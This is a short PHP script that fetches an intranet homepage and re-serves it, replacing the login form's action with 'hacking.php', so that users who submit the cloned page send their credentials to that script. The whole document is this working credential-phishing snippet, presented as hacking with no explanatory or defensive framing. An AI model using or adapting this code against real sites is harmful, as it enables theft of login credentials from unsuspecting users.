<?php
$ressource = fopen("http://intranet/","r");
while ($ligne = fgets($ressource)) {
    if (trim($ligne)=='<form class="form" method="POST" id="f1" action="http://intranet/authentification/sauve" >')
        $ligne='<form class="form" method="POST" id="f1" action="hacking.php" >';
        
    echo $ligne;
}
?>